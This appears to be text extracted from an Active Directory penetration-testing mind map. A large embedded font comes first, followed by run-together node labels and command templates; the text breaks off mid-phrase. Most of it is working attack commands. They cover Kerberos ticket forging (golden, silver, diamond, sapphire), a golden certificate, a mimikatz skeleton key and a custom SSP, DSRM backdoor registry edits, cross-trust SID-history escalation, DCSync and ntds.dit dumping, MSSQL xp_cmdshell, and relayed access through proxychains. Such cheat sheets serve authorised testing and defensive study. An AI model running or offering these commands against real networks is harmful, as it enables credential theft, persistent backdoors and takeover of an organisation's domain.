@font-face { font-family: Nunito; src: url(data:font/
woff2;base64,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); }PersistencePersistence...ACL manipulationDC shadowSaphire Ticketticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored'Diamond ticketticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>Golden certificatecertipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>Custom SSPmimikatz "privilege::debug" "misc::memssp" "exit"C:\Windows\System32\kiwissp.logSkeleton Keymimikatz "privilege::debug" "misc::skeleton" "exit" #password is mimikatzDirectory Service Restore Mode (DSRM)PowerShell New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORDSilver Ticketticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"Golden ticketmimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>ADD DAnet group "domain admins" myuser /add /domainTrustsMssql links MSSQLMSSQL trusted links doesn't care of trust linkmssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>trustlinksp_linkedserversuse_linkGet-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>External Trust DomainA --> DomainB trust (A trust B / B access A)password reuse lat move (creds/pth/...)lat move (creds/pth/...)DomainA <-- DomainB trust (B trust A / A access B)Same as double trust, but no unconstrained delegation as B can't connect to ADomainA <--> DomainB trust (B trust A, A trust B)from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNALfrom A to B FOREST_TRANSITIVEADCS abuse ADCSADCSUnconstrained delegationcoerce dc_b on dc_a unconstrained delegationunconstrained delegationSID History on B PassTheTicketPassTheTicketTrust ticketsecretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuserGolden ticketticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeusermimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgtmimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /pttForeign group and users ACLACLGroup with foreign Domain Group MembershipMATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN pUsers with foreign Domain Group MembershipMATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN ppassword reuse lat move (creds/pth/...)lat move (creds/pth/...)Parent->Childsame as Child to parentChild->ParentUnconstrained delegationcoerce parent_dc on child_dc domainunconstrained delegationunconstrained delegationGolden Ticket PassTheTicketPassTheTicketticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuserraiseChild.py <child_domain>/<user>:<password>mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgtmimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /pttTrust Key PassTheTicketPassTheTicketsecretsdump.py -just-dc-user '<parent_domain>$'   <domain>/<user>:<password>@<dc_ip>ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeusermimikatz lsadump::trust /patchmimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /pttEnumerationGet Domains SIDlookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>sharphound.exe -c trusts -d <domain>MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN pldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trustsGet-DomainTrustMappingGet-DomainTrust -Domain <domain>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()nltest.exe /trusted_domainsDomain adminGrab backup Keys CredentialsCredentialsdonpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvkDump ntds.dit Crack hashCrack hashLateral moveLateral movecertsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administratormsf> windows/gather/credentials/domain_hashdumpntdsutil "ac i ntds" "ifm" "create full c:\temp" q qsecretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extractsecretsdump.py '<domain>/<user>:<pass>'@<ip>nxc smb <dcip> -u <user> -p <password> -d <domain> --ntdsLateral MoveMSSQLmssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>trustlinksp_linkedserversuse_linkTrustTrustMSSQLMSSQLxp_dir_tree <ip>COERCE SMBCOERCE SMBenum_impersonateexec_as_login <login>MSSQLMSSQLexec_as_user <user>MSSQLMSSQLenable_xp_cmdshellxp_cmdshell <cmd>Low AccessLow Accessenum_dbMATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN pMSSQLMSSQLUsers or Computers with SQL adminfind mssql accessnxc mssql <ip> -u <user> -p <password> -d <domain>MSSQLMSSQLCertificate (pfx)Pass the certificateschannelcertipy cert -pfx "<pfx_file>" -nokey -out "user.crt"certipy cert -pfx "<pfx_file>" -nocert -out "user.key"passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>certipy auth -pfx <pfx_file> -ldap-shelladd_computerSet RBCD RBCDRBCDpkinitcertipy auth -pfx <crt_file> -dc-ip <dc_ip>Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /showgettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass  "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"unpac the hashgettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> "<domain>/<dc_name>" <tgt.ccache>getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>'certipy auth -pfx <crt_file> -dc-ip <dc_ip>Socks (relay)proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>Authority/SystemAuthority/Systemproxychains atexec.py  -no-pass  <domain>/<user>@<ip> "command"Authority/SystemAuthority/Systemproxychains smbclient.py -no-pass <user>@<ip>Search filesSearch filesproxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'DCSYNCDCSYNCproxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-passMSSQLMSSQLproxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sidsKerberosAeskey Adminproxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>'impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)Pass the 